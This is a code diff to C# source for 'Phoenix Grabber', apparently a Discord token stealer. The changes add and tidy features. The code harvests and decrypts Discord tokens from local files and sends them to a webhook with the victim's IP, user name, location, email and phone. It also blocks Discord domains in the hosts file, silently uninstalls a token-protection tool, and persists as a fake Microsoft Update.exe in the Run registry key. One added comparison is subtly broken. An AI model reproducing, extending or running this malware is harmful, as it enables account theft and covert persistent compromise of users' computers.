@@ -52,7 +52,7 @@ namespace Program
         #endregion
 
         #region Start
-        static List<string> tokens = new List<string>();
+        static readonly List<string> tokens = new List<string>();
 
         static void Start()
         {
@@ -83,8 +83,7 @@ namespace Program
                     {
                         foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}"))
                         {
-                            if (Check(match.Value) == true && !tokens.Contains(match.Value))
-                                tokens.Add(match.Value);
+                            if (Check(match.Value) == true && !tokens.Contains(match.Value)) tokens.Add(match.Value);
                         }
                     }
                 }
@@ -101,8 +100,7 @@ namespace Program
                             byte[] bytes = new byte[cipher.GetOutputSize(Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]).Skip(15).ToArray().Length)];
                             cipher.DoFinal(bytes, cipher.ProcessBytes(Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]).Skip(15).ToArray(), 0, Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]).Skip(15).ToArray().Length, bytes, 0));
                             string token = Encoding.UTF8.GetString(bytes).TrimEnd("\r\n\0".ToCharArray());
-                            if (Check(token) == true && !tokens.Contains(token))
-                                tokens.Add(token);
+                            if (Check(token) == true && !tokens.Contains(token)) tokens.Add(token);
                         }
                     }
                 }
@@ -113,8 +111,7 @@ namespace Program
                         if (file.Equals("LOCK")) continue;
                         foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}"))
                         {
-                            if (Check(match.Value) == true && !tokens.Contains(match.Value))
-                                tokens.Add(match.Value);
+                            if (Check(match.Value) == true && !tokens.Contains(match.Value)) tokens.Add(match.Value);
                         }
                     }
                 }
@@ -127,7 +124,7 @@ namespace Program
         {
             try
             {
-                Request("//Webhook", "POST", null, "{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | " + DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss") + "\"},\"author\":{\"name\":\"Phoenix Grabber\",\"url\":\"https://github.com/extatent\"},\"fields\":[{\"name\":\"IP Address\",\"value\":\"" + IP() + "\"},{\"name\":\"Computer Name\",\"value\":\"" + Environment.MachineName + "\"},{\"name\":\"Location\",\"value\":\"" + Location() + "\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
+                Request("//Webhook", "POST", null, "{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | " + DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss") + "\"},\"author\":{\"name\":\"Phoenix Grabber\",\"url\":\"https://github.com/extatent\"},\"fields\":[{\"name\":\"IP Address\",\"value\":\"" + IP() + "\"},{\"name\":\"User Name\",\"value\":\"" + Environment.UserName + "\"},{\"name\":\"Machine Name\",\"value\":\"" + Environment.MachineName + "\"},{\"name\":\"Location\",\"value\":\"" + Location() + "\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
                 if (tokens.Count != 0)
                 {
                     foreach (string token in tokens)
@@ -146,13 +143,21 @@ namespace Program
                         var phone = info["phone"];
                         if (string.IsNullOrEmpty(phone))
                             phone = "N/A";
+                        var nitro = "N/A";
+                        try
+                        {
+                            var premiumtype = info["premium_type"];
+                            if (premiumtype = "1") nitro = "Classic";
+                            else if (premiumtype = "2") nitro = "Boost";
+                        }
+                        catch { nitro = "None"; }
                         var request2 = Request("/users/@me/settings", "GET", token);
                         dynamic info2 = new JavaScriptSerializer().DeserializeObject(request2);
                         var status = info2["status"];
                         if (string.IsNullOrEmpty(status))
                             status = "N/A";
                         var creationdate = DateTimeOffset.FromUnixTimeMilliseconds((Convert.ToInt64(id) >> 22) + 1420070400000).DateTime.ToString();
-                        Request("//Webhook", "POST", null, "{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | github.com/extatent\"},\"author\":{\"name\":\"Phoenix Grabber\",\"url\":\"https://github.com/extatent\"},\"fields\":[{\"name\":\"Username\",\"value\":\"" + username + "\"},{\"name\":\"ID\",\"value\":\"" + id + "\"},{\"name\":\"Email\",\"value\":\"" + email + "\"},{\"name\":\"Phone Number\",\"value\":\"" + phone + "\"},{\"name\":\"Status\",\"value\":\"" + status + "\"},{\"name\":\"Creation Date\",\"value\":\"" + creationdate + "\"},{\"name\":\"Token\",\"value\":\"" + token + "\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
+                        Request("//Webhook", "POST", null, "{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | github.com/extatent\"},\"author\":{\"name\":\"Phoenix Grabber\",\"url\":\"https://github.com/extatent\"},\"fields\":[{\"name\":\"Username\",\"value\":\"" + username + "\",\"inline\": true},{\"name\":\"ID\",\"value\":\"" + id + "\",\"inline\": true},{\"name\":\"Email\",\"value\":\"" + email + "\",\"inline\": true},{\"name\":\"Phone Number\",\"value\":\"" + phone + "\",\"inline\": true},{\"name\":\"Status\",\"value\":\"" + status + "\",\"inline\": true},{\"name\":\"Nitro\",\"value\":\"" + nitro + "\",\"inline\": true},{\"name\":\"Creation Date\",\"value\":\"" + creationdate + "\",\"inline\": true},{\"name\":\"Token\",\"value\":\"" + token + "\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
                         Thread.Sleep(200);
                     }
                 }
@@ -171,8 +176,7 @@ namespace Program
                     string[] domains = { "discord", "support.discord", "canary.discord", "ptb.discord" };
                     foreach (var domain in domains)
                     {
-                        using (StreamWriter writer = File.AppendText(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts"))
-                            writer.WriteLine("\n0.0.0.0 " + domain + ".com");
+                        using (StreamWriter writer = File.AppendText(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts")) writer.WriteLine("\n0.0.0.0 " + domain + ".com");
                     }
                 }
             }
@@ -200,8 +204,7 @@ namespace Program
             {
                 foreach (var name in processlist)
                 {
-                    if (process.ProcessName.ToLower() == name)
-                        process.Kill();
+                    if (process.ProcessName.ToLower() == name) process.Kill();
                 }
             }
         }
@@ -210,18 +213,21 @@ namespace Program
         #region Anti Protector
         static void AntiProtector()
         {
-            foreach (Process process in Process.GetProcessesByName("DiscordTokenProtector"))
-                process.Kill();
-
-            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\DiscordTokenProtector\\unins000.exe"))
+            try
             {
-                Process process = new Process();
-                process.StartInfo.FileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\DiscordTokenProtector\\unins000.exe";
-                process.StartInfo.Arguments = "/verysilent";
-                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                process.Start();
-                process.WaitForExit();
+                foreach (Process process in Process.GetProcessesByName("DiscordTokenProtector")) process.Kill();
+
+                if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\DiscordTokenProtector\\unins000.exe"))
+                {
+                    Process process = new Process();
+                    process.StartInfo.FileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\DiscordTokenProtector\\unins000.exe";
+                    process.StartInfo.Arguments = "/verysilent";
+                    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                    process.Start();
+                    process.WaitForExit();
+                }
             }
+            catch { }
         }
         #endregion
 
@@ -306,7 +312,13 @@ namespace Program
         #region Run On Startup
         static void RunOnStartup()
         {
-            try { File.Copy(Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Update.exe"); RegistryKey startup = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true); startup.SetValue("Microsoft", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Update.exe"); } catch { }
+            try
+            {
+                File.Copy(Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Update.exe");
+                RegistryKey startup = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                startup.SetValue("Microsoft", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Update.exe");
+            }
+            catch { }
         }
         #endregion
     }
